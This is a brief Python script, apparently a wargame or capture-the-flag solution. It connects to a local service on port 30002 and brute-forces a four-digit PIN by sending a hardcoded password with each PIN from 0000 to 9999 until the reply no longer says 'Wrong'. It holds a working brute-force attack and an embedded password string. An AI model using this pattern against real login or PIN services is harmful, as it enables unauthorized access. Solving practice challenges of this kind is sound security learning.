#!/usr/bin/env python
import socket
s = socket.socket()
s.connect(('localhost', 30002))
s.recv(1024)
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

for i in range(0, 10000):
    pin = str(i).rjust(4, '0')
    payload = password + ' ' + str(pin) + '\n'
    s.sendall(payload)
    data = s.recv(1024)
    if not 'Wrong' in data:
        print(pin, data)
        break
s.close()